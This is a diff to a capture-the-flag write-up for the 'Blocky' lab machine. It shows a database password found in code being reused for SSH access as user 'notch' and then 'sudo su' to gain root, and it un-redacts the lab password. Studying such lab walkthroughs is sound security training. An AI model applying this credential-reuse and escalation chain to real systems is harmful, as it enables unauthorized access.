@@ -122,20 +122,12 @@ public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
 The MySQL root password is likely reused for SSH.
 
 ```bash
-ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-rsa notch@X.X.X.X
+ssh notch@X.X.X.X
 ```
 
-**Password:** `PASSWORD_REDACTED`
+**Password:** `8YsqfCTnvxAUeduzjNSXe22`
 
 **Success!** Logged in as `notch`
-
-### Alternative - Try Other Users
-
-```bash#Try root
-ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-rsa root@X.X.X.X
-```
-
-**Password:** `PASSWORD_REDACTED`
 
 ---
 
@@ -157,7 +149,6 @@ User notch may run the following commands on Blocky:
 
 ```bash
 sudo su
-# Enter password: PASSWORD_REDACTED
 ```
 
 **Success!** Now root!
